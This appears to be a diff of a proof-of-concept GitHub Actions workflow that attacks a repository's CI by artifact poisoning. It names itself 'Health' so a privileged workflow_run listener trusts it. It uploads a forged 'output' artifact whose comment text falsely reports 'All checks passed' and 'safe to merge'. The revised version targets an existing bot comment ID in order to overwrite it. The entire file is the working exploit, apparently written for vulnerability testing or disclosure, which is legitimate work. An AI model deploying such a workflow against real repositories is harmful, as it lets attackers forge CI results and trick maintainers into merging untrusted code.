@@ -1,5 +1,3 @@
-# Attacker-supplied workflow whose *name* matches the workflow that the privileged
-# workflow_run listener watches for ("Health").
 name: Health
 on:
   pull_request:
@@ -9,21 +7,15 @@ jobs:
   forged:
     runs-on: ubuntu-latest
     steps:
-      - name: Craft attacker-controlled "summary" artifact
+      - name: Craft attacker-controlled "summary" artifact that targets an existing bot comment
         run: |
           mkdir -p output
-          {
-            printf '%s\n' '## PR Health ✅'
-            printf '\n'
-            printf '%s\n' 'All checks passed. **Forged by the PR author** (poc-dartnative-ps-1).'
-            printf '%s\n' ''
-            printf '%s\n' '> Health checks are green — safe to merge.'
-          } > output/comment.md
-          echo "${GITHUB_EVENT_NUMBER}" > output/issueNumber
+          printf '%s\n' '## PR Health ✅' '' 'All checks passed. **Forged overwrite** (poc-dartnative-ps-2).' > output/comment.md
+          echo "" > output/issueNumber
+          echo "6609743357" > output/commentId
         env:
           GITHUB_EVENT_NUMBER: ${{ github.event.number }}
-      - name: Upload forged artifact named like the real one
-        uses: actions/upload-artifact@v4
+      - uses: actions/upload-artifact@v4
         with:
           name: output
           path: output/
